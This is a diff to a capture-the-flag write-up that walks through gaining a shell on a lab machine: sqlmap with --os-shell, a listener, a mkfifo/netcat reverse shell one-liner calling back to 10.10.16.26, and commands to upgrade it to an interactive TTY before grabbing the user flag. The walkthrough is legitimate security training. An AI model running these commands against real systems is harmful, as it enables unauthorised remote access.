@@ -102,7 +102,11 @@ sqlmap -r new.req --os-shell
 * --os-shell means prompt for an interactive operating system shell
 *  If asked "Do you want to retrieve the command standard output? [Y/n/a]" --> Click a = ALWAYS
 
-4. Get the reverse shell payload, revshells.com can help us here, we can try **mkfifo**
+4. Do not forget to active the listener
+
+![image](https://user-images.githubusercontent.com/99097743/169885449-68625d07-68cc-4ef4-9b7c-2d9099f73384.png)
+
+5. Get the reverse shell payload, revshells.com can help us here, we can try **mkfifo**
 
 ```sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.26 87 >/tmp/f
@@ -110,17 +114,18 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.26 87 >/tmp/f
 
 ![image](https://user-images.githubusercontent.com/99097743/169886969-48f93363-4338-43c0-ab9b-5120fedddf3e.png)
 
-5. Do not forget to active the listener
-
-![image](https://user-images.githubusercontent.com/99097743/169885449-68625d07-68cc-4ef4-9b7c-2d9099f73384.png)
-
-6. Improve the shell 
+6. We can improve the shell and make it fully interactive using the following commands
 
 ```sh
 python3 -c 'import pty;pty.spawn("/bin/bash");'
+stty raw -echo
+fg
+export TERM=xterm
 ```
 It worked!
 
 ![image](https://user-images.githubusercontent.com/99097743/169887719-ad875cea-7937-4477-8af5-66954b722d72.png)
 
+We can now capture the user flag!
 
+![image](https://user-images.githubusercontent.com/99097743/169891271-24ed9ae1-def0-48b2-b89f-c0c244f61f64.png)
